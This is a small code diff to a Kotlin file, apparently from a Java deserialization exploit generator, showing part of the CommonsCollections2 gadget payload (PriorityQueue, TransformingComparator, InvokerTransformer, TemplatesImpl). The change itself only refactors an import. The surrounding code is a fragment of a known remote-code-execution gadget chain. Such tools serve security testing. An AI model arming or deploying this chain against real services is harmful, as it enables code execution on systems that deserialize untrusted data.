@@ -1,6 +1,5 @@
 package com.xhstormr.app
 
-import com.xhstormr.app.Gadgets.createTemplatesImpl
 import java.util.PriorityQueue
 import org.apache.commons.collections4.comparators.TransformingComparator
 import org.apache.commons.collections4.functors.InvokerTransformer
@@ -8,7 +7,7 @@ import org.apache.commons.collections4.functors.InvokerTransformer
 object CommonsCollections2ObjectPayload : ObjectPayload {
 
     override fun getObject(clazz: Class<*>): Any {
-        val templates = createTemplatesImpl(clazz)
+        val templates = Gadgets.createTemplatesImpl(clazz)
         // mock method name until armed
         val transformer = InvokerTransformer<Any, Any>(
             "toString",
